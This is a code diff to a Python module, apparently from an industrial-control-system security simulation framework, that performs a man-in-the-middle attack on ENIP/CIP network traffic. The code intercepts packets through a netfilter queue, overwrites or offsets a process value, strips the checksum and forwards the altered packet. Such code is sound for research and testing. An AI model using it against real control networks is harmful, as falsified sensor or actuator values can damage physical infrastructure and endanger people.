@@ -1,5 +1,5 @@
-from dhalsim.network_attacks.enip_cip_parser.cip import *
-from scapy.all import *
+#from dhalsim.network_attacks.enip_cip_parser.cip import *
+import dhalsim.network_attacks.enip_cip_parser.cip
 from dhalsim.network_attacks.mitm_netfilter_queue_subprocess import PacketQueue
 import argparse
 from pathlib import Path
@@ -7,8 +7,8 @@ from pathlib import Path
 import os
 import sys
 
-#from scapy.layers.inet import IP, TCP
-#from scapy.packet import Raw
+from scapy.layers.inet import IP, TCP
+from scapy.packet import Raw
 
 from dhalsim.network_attacks.utilities import translate_payload_to_float, translate_float_to_payload
 
@@ -19,18 +19,19 @@ class MiTMNetfilterQueue(PacketQueue):
         self.attacked_tag = self.intermediate_attack['tag']
         self.session_id = 0
 
-    def capture(self, pkt):
+    def capture(self, packet):
         """
         This function is the function that will run in the thread started in the setup function.
 
         For every packet that enters the netfilterqueue, it will check its length. If the length is
         in between 102, we are dealing with a CIP packet. We then change the payload of that
         packet and delete the original checksum.
-        :param pkt: The captured packet.
+        :param packet: The captured packet.
         """
-        self.logger.debug('capture method')
+        self.logger.debug('mitm capture method')
         try:
-            p = IP(pkt.get_payload())
+            p = IP(packet.get_payload())
+
             #self.logger.debug('packet')
             #self.logger.debug(p.show())
             if 'ENIP_TCP' in p:
@@ -55,7 +56,6 @@ class MiTMNetfilterQueue(PacketQueue):
                                 p[Raw].load = translate_float_to_payload(
                                     self.intermediate_attack['value'], p[Raw].load)
                             elif 'offset' in self.intermediate_attack.keys():
-                                self.logger.debug('Offsetting value')
                                 p[Raw].load = translate_float_to_payload(
                                     translate_payload_to_float(p[Raw].load) + self.intermediate_attack[
                                         'offset'], p[Raw].load)
@@ -65,9 +65,10 @@ class MiTMNetfilterQueue(PacketQueue):
 
                             del p[TCP].chksum
 
-                            pkt.set_payload(bytes(p))
+                            packet.set_payload(bytes(p))
                             self.logger.debug(f"Value of network packet for {p[IP].dst} overwritten.")
-            pkt.accept()
+
+            packet.accept()
         except Exception as exc:
             print(exc)
             if self.nfqueue:
